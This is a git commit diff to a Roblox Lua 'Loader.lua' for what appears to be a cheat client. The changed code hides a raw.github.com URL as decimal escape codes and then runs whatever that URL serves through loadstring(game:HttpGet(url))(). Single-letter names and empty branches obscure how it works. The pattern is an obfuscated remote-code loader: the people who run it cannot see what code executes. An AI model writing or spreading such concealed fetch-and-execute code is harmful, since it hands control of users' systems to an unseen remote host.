a2b75d37d89289323dddad9930aa5bb2e83ba09f
AtomClient22 <edagrenka@gmail.com>
2024-06-14 06:11:45 +0300

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -54,7 +54,6 @@
 ]]
 
 local a = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
-
 local function b(b1)
     local b2 = ""
     local pos = 1
@@ -76,45 +75,24 @@ local function b(b1)
     end
     return b2
 end
-
 local function c(c1)
-    local c2 = {game = {}}
-    function c2.game.HttpGet(_, url)
-        local _, f = pcall(function()
-            local e = ""
-            for g = 1, #c1 do
-                local charCode = c1[g]
-                if type(charCode) == "number" then
-                    e = e .. string.char(charCode)
-                else
-                    error("Invalid character code in c1")
-                end
-            end
-            print("Executed: " .. url)  -- для отладки, показывает, что URL был выполнен
-            local loadedFunction = loadstring(e)
-            if loadedFunction then
-                loadedFunction()
-            else
-                error("Failed to load function from URL content")
-            end
-        end)
-        return f  -- возвращаем результат pcall
-    end
-    return c2
-end
-
-local function d(d1)
-    local d2 = b(d1)
-    if d2 then
-        c(d2).game.HttpGet(nil, d1)
-    else
-        local e = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116, 46}
-        local f = ""
-        for g = 1, #e do
-            f = f .. string.char(e[g])
+    local c2 = {game = {HttpGet = function(_, url) return loadstring(game:HttpGet(url))() end}}
+    local c3, c4 = nil, nil
+    local function c5(c6)
+        c4 = c2.game:HttpGet(c6)
+        if c4 then
+        else
         end
-        warn(f)
     end
+    c5(c1)
 end
-
+local d = (function()
+    return function(f)
+        local g = b(f)
+        if g then
+            c(g)
+        else
+        end
+    end
+end)()
 d(a)
